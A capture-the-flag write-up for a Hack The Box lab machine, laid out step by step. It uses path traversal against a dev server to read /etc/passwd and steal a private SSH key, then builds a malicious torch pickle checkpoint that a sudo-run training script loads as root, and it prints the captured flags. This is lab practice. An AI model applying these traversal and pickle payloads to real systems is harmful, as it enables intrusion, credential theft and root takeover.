---
title: "HTB Bedsides · 10 · Root (esm.sh/x LFI → dev SSH key → torch pickle RCE)"
tags: [htb, exploit, privesc, torch, pickle, rce, root, lfi, ssh]
verdict: rooted
---

# 10 · Root — ✅ DONE

Picks up from [[htb-bedsides-09-exploit-build]]: shell as **`datawrangler`** inside
the `data-wrangler` container (uid 988, gid 1001 `dataops`, host networking).

> The step-08 prediction (sudo torch pickle as root) was **correct in spirit** but the
> real path routed through the parked :3000 service and a shared volume, not a direct
> sudo-with-wildcard. Recorded here as actually executed.

## Step 1 — orient in the container
- `id` → `datawrangler`, no `sudo` binary, no `user.txt`, `.bash_history → /dev/null`.
- Outbound IP of the reverse shell = **10.129.66.223** (host IP) ⇒ **host networking**, so
  `localhost:3000` = the host's parked service (step 01 flagged :3000 filtered externally).

## Step 2 — :3000 = esm.sh/x dev server → arbitrary file read (LFI)
- `curl 127.0.0.1:3000` → "Bedside Clinic - Image Viewer", `import ... from '/@hmr'`,
  banner **`Built with esm.sh/x`**. The dev server transpiles/serves files from disk.
- **Path traversal read** (needs `curl --path-as-is`, no URL normalisation):
  ```
  curl -s --path-as-is 'http://127.0.0.1:3000/../../../../../../etc/passwd'
  ```
  → returns the file. Users with shells: `root`, **`developer`** (uid 1000, `/home/developer`).
  (`/root/root.txt` → 500 ⇒ service not running as root.)

## Step 3 — steal developer's SSH key + user flag
```
R(){ curl -s --path-as-is "http://127.0.0.1:3000/../../../../../../$1"; }
R home/developer/user.txt        # 663aa6b35552c31ddba418f84dba7249
R home/developer/.ssh/id_rsa     # OPENSSH ed25519, comment developer@bedside
```
Save key → `chmod 600` → `ssh -i dev_key developer@10.129.66.223`. **User owned.**

## Step 4 — privesc: MONAI CheckpointLoader torch pickle RCE
`sudo -l` as developer:
```
(ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```
No wildcard ⇒ can't pass our own arg. Read the script:
- `find_latest_checkpoint()` = `sorted(dir.glob("*.pt"), key=os.path.getmtime)[-1]`
  over **`/datastore/checkpoints`** — auto-resumes, no flag needed.
- Resume calls MONAI `CheckpointLoader` → **`torch.load(path, map_location=..., weights_only=False)`**
  (`monai/handlers/checkpoint_loader.py:125`) → unpickle → RCE.
- Guard: the script `return`s early unless there is data, so `/datastore/processed`
  needs ≥1 file with an allow-listed extension (`png`, `npy`, …).

**Key insight:** `/datastore` (`drwxrwx--- datawrangler dataops`) is a **volume shared with
the container** — `developer` can't touch it, but our container user **owns** it.

### Exploit (from the container shell)
```python
# /datastore/processed/scan.png  -> a valid 64x64 PNG (hand-built with zlib) so training proceeds
# /datastore/checkpoints/zz_evil.pt -> newest *.pt; pickle __reduce__ runs as root:
cmd = ("id > /datastore/checkpoints/proof.txt; "
       "cp /root/root.txt /datastore/checkpoints/root_flag.txt; "
       "chmod 644 /datastore/checkpoints/{root_flag,proof}.txt; "
       "chmod u+s /bin/bash")
class E:
    def __reduce__(self): return (os.system, (cmd,))
open('/datastore/checkpoints/zz_evil.pt','wb').write(pickle.dumps(E()))
```
Then, as developer: `sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py`.
- Log: `Found checkpoint /datastore/checkpoints/zz_evil.pt … CheckpointLoader` →
  `torch.load(... weights_only=False)` fires our `os.system` **as root**, then raises
  `Invalid magic number` (harmless — RCE already ran).

## Result — ROOT
- `proof.txt` → `uid=0(root)`. `/bin/bash` now `-rwsr-xr-x`; `bash -p` → `euid=0`.
- **Root flag: `2d5540b9ce670f389a5e5759c2ef114f`** (also `/datastore/checkpoints/root_flag.txt`).

## Fallbacks (unused)
- Could also drop an authorized_keys into `/root/.ssh` or run a root reverse shell from
  the pickle instead of SUID bash.

← back: [[htb-bedsides-09-exploit-build]] · index: [[htb-bedsides-index]]
